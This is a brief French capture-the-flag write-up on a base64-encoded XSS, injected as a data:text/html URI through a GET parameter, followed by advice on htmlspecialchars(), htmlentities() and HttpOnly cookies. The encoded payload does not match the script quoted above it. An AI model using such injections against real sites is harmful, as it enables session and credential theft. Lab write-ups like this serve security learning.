# XSS BASE 64

plus d'infos sur:
http://venom630.free.fr/geo/tutz/securite_informatique/xss/

Ici on est sur une faille xss en get qui doit etre encoder en base64,
on peut voir que sur la page index.php
on a une image qui est cliquable, et qui redirige 
vers une autre page avec le chemin de l'image en argument.
si on encode
```<script>alert("Bonjour les amis");</script> 
```
en base64, on obtient:
```
PHNjcmlwdD5hbGVydCgiSGVsbG8hIEkgYW0gYW4gYWxlcnQgYm94ISEiKTs8L3NjcmlwdD4=
```
afin que le navigateur interprete le html nous prefixons le hash de 
```
data:text/html;base64,
```
ce qui donne:
```
data:text/html;base64, PHNjcmlwdD5hbGVydCgiSGVsbG8hIEkgYW0gYW4gYWxlcnQgYm94ISEiKTs8L3NjcmlwdD4=
```

on va ensuite modifier le lien 
```
<a href="?page=media&src=nsa">
```
par:
```
<a href="?page=media&src=data:text/html;base64, PHNjcmlwdD5hbGVydCgiSGVsbG8hIEkgYW0gYW4gYWxlcnQgYm94ISEiKTs8L3NjcmlwdD4=">
````
et l'on obtient le flag:


## Comment s'en premunir

Il faut absolument utiliser les fonctions php
```
htmlentities()
```
qui filtre toutes les entités html.
OU
```

htmlspecialchars()
```
qui filtre toutes les entités html, permet par exemple de filtrer les symboles du type <, & ou encore ", en les remplaçant par leur équivalent en HTML. Par exemple :
 ```
Le symbole & devient &amp;

Le symbole " devient &quot;

Le symbole ' devient &#39;
```
Au possible, il faut placer des cookies avec le paramètre HttpOnly, empêchant leur récupération avec JavaScript (Attention elle n’est pas forcément supportée par tous les navigateurs).
